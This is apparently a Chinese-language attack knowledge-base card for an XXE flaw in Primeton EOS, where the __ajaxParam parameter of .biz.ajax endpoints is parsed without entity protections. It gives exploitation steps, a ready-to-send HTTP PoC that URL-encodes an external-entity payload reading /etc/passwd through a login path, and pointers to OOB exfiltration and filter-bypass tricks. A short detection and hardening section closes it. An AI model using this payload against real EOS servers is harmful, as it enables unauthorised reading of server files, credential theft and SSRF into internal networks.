---
id: web-generic-xxe-eos-bizajax-ajaxparam-xmlparse
title: 普元 EOS .biz.ajax 的 __ajaxParam 参数 XmlUtil 解析 XXE
type: scenario
domain: web
path: web/generic/xxe
technique: eos-ajaxparam-xmlparse-xxe
aliases:
- EOS XXE
- __ajaxParam
- AjaxParameterSet XXE
- 普元 EOS XXE
- com.primeton.ext.engine.core.processor.AjaxBizProcessor
tags:
- java
- xxe
- eos
- primeton
- xml
- ajaxbizprocessor
- file-read
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V607
  verified_at: '2026-11-12T18:51:09+08:00'
  notes: 已对照原文与图05-06核对：.biz.ajax 的 AjaxParameterSet.init 读取 __ajaxParam→URLDecoder.decode→XmlUtil.parseStringThrowsException/parseString 未禁外部实体；图05 POST /coframe/auth/login/1234.biz.ajax 的 __ajaxParam 为 <!DOCTYPE xdsec [...] <!ENTITY xxe SYSTEM "file:///tmp/pa"> 且在 params 中引用 &xxe;；图06 RuntimeException java.io.IOException \tmp\pa（系统找不到指定的路径）并回显原始 XML，确证实体解析，与卡片一致。修正：原文默认 web.xml 引自官网未标版本（EOS6 仅产品简介，图03 依赖 eos-server-access-7.1.4.0.jar），移除卡内 EOS6 归因并清除 affected_versions（KB 与 staging 同步）。未在本机复跑。
---

## 一句话结论

普元 EOS 的 `.biz.ajax` 处理器会把请求参数 `__ajaxParam` URL 解码后交给 `XmlUtil.parseString` 做 DOM 解析，且未禁用 DTD/外部实体；攻击者提交带 `<!DOCTYPE ... <!ENTITY xxe SYSTEM "file:///...">]>` 的 XML，即可让服务端解析外部实体，实现任意文件读取、SSRF 或 OOB 外带（原文通过 `file:///tmp/pa` 路径不存在的报错确认实体已被解析）。

## 原理

- **入口映射**：EOS 默认 `web.xml` 把 `*.ajax` 等后缀映射到 `ControllerServlet`；`handler-processor.xml` 中 `ajaxBizProcessor` 的 suffix 为 `.biz.ajax`，对应 `com.primeton.ext.engine.core.processor.AjaxBizProcessor`。
- **参数读取**：`AjaxBizProcessor.createParameterSet` 调用 `ParameterBuilder.createAjaxParamSet(request)` → `AjaxParameterSet.init()`；后者读取 `request.getParameter("__ajaxParam")`，缺省时用 `<root><params></params><data></data></root>`。
- **URL 解码与解析**：取到参数后先 `URLDecoder.decode(e, "UTF-8")`，再根据 XML 头部是否含 encoding 选择 `XmlUtil.parseStringThrowsException` 或 `XmlUtil.parseString`。`XmlUtil` 使用 DOM 解析器（`DocumentBuilderFactory`）但未设置 `disallow-doctype-decl`、`external-general-entities`、`external-parameter-entities`、`load-external-dtd` 等安全特性，也没有 `setEntityResolver` 屏蔽外部实体。
- **为什么能触发**：XML 解析器默认允许 DOCTYPE 与外部实体；`<!ENTITY xxe SYSTEM "file:///tmp/pa">` 在解析时会被展开，实体值可被拼入后续参数/错误信息。原文日志出现 `java.lang.RuntimeException: java.io.IOException: \tmp\pa（系统找不到指定的路径。）`，并打印了带 `<!DOCTYPE xdsec [ ... <!ENTITY xxe SYSTEM "file:///tmp/pa"> ...]>` 的原始 XML，证明解析器确实尝试读取了外部实体。
- **危害**：可读取服务端本地文件（配置文件、密钥、源码）、发起 SSRF 访问内网服务；若响应/错误信息回显实体值则直接带外，否则可用 OOB（外部 DTD + HTTP/DNS）外带。原文只展示了错误型确认，未展示文件内容回显。

## 触发条件

- 目标为普元 EOS（原文引用官网默认配置；截图依赖为 eos-server-access-7.1.4.0.jar，原文未明确标注产品版本；或相同 `AjaxBizProcessor`/`XmlUtil` 代码的 EOS 系产品），`.biz.ajax` 映射与 `ajaxBizProcessor` 处理器生效。
- 请求能到达 `AjaxParameterSet.init`（示例路径 `/coframe/auth/login/<id>.biz.ajax`，登录类路径通常无需登录；实际鉴权取决于拦截器白名单）。
- `XmlUtil` 未禁用 DTD/外部实体（默认配置即如此）。
- 目标进程对要读取的文件有权限；若需 OOB，目标可出网到攻击者 DNS/HTTP。

## 利用步骤

1. 指纹确认 EOS：访问任意 `.biz.ajax` 路径，观察 `AjaxParameterSet`/`XmlUtil` 相关报错或默认 XML 行为。
2. 构造 XML：`<!DOCTYPE xdsec [ <!ELEMENT methodname ANY > <!ENTITY xxe SYSTEM "file:///etc/passwd" > ]>`，并在 `<params>` 中引用 `&xxe;`。
3. 对整个 XML 做 URL 编码后放入 `__ajaxParam` 参数，POST 到 `.biz.ajax` 路径。
4. 服务端 URL 解码并 DOM 解析，外部实体被展开；观察响应/错误信息中的实体值，或用 OOB DTD 把内容外带。
5. 验证：原文通过 `file:///tmp/pa` 不存在导致的 `IOException` 日志确认实体解析；读到真实文件时可在响应或外带通道看到内容。

## PoC

```http
POST /coframe/auth/login/1234.biz.ajax HTTP/1.1
Host: target:8080
Content-Type: application/x-www-form-urlencoded
Content-Length: <len>

__ajaxParam=%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22utf-8%22%3F%3E%0A%3C!DOCTYPE%20xdsec%20%5B%0A%3C!ELEMENT%20methodname%20ANY%3E%0A%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%0A%5D%3E%0A%3Croot%3E%3Cparams%3E%3Cparam%3E%3Ckey%3EuserName%3C%2Fkey%3E%3Cvalue%3E%26xxe%3B%3C%2Fvalue%3E%3C%2Fparam%3E%3C%2Fparams%3E%3Cdata%3E%3C%2Fdata%3E%3C%2Froot%3E
```

说明：原文 payload 的实体目标为 `file:///tmp/pa`，用于确认实体被解析；实际利用替换为可读文件或 OOB DTD。

## 变体与关联

- [[web-generic-xxe-ooxml-container-upload]]、[[web-generic-xxe-inband-file-read-default-insecure]]：通用 XXE 文件读/回显手法，可组合使用。
- [[web-generic-xxe-cdata-parameter-entity-wrap]]、[[web-generic-xxe-data-uri-base64-hide-system-uri]]：实体编码与隐藏技巧，可绕过简单关键字过滤。
- [[web-generic-xxe-local-dtd-error-based]]、[[web-generic-xxe-oob-exfil]]：无回显时的错误型/OOB 外带。
- [[web-generic-xxe-java-netdoc-file-directory-listing]]：Java 解析器的目录列举技巧。
- 变体：EOS 其它调用 `XmlUtil.parseString` 的参数（如流程、配置导入）也可能存在同类解析；可换外部 DTD、参数实体、XInclude 等。
- 边界：目标升级/加固 XmlUtil（禁用 DOCTYPE、实体与外部 DTD）、WAF 拦截 `<!DOCTYPE`/`SYSTEM`、或参数在解析前被签名/加密时链断。

## 检测与防御

- 检测：请求参数 `__ajaxParam` 中出现 `<!DOCTYPE`、`<!ENTITY`、`SYSTEM`、`file://`、`http://` 等；EOS 日志出现 `XmlUtil`/`DocumentBuilderFactory` 解析异常并回显原始 XML。
- 防御：在 `XmlUtil`/`DocumentBuilderFactory` 上设置 `disallow-doctype-decl=true`、`external-general-entities=false`、`external-parameter-entities=false`、`load-external-dtd=false`，并设置空 `EntityResolver`；对 `__ajaxParam` 做 XML 结构白名单校验；WAF 侧拦截 DOCTYPE/实体声明；升级 EOS 补丁。
- 响应：保留原始请求与解析日志，确认是否读取敏感文件或产生外连。
